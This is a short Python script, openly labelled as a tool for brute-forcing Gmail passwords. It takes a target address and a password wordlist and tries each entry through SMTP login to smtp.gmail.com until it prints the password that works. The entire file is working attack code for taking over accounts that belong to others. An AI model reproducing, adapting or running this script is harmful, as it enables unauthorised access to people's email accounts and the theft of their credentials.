#!/bin/python3


import smtplib
from termcolor import colored
print(colored('''        *****************************************************************************************
        |     Bruteforcing th gmail password ...If the settings are changed in google account... |
        |     Only if allowing unknown apps to use account                                       |
        *****************************************************************************************  ''','green'))
smtpserver=smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()
try :
    user = input(colored("[$] Enter the gmail id :",'blue'))
    password = input(colored("[$] Enter the path of passwords list file : ",'blue'))
    file = open(password,"r")
    for paswd in file:
        paswd=paswd.strip('\n')
        try:
            smtpserver.login(user, paswd)
            print(colored("[*]Password Found "+ paswd ,'green'))
            break
        except smtplib.SMTPAuthenticationError:
            print(colored("[-] Wrong password: "+ paswd, 'red'))
except KeyboardInterrupt:
    print(colored("Forcly ended by ctrl ^C",'red'))
except FileNotFoundError:
    print(colored("File not found ",'red'))
except:
    print(colored("Exception",'red'))
    exit()
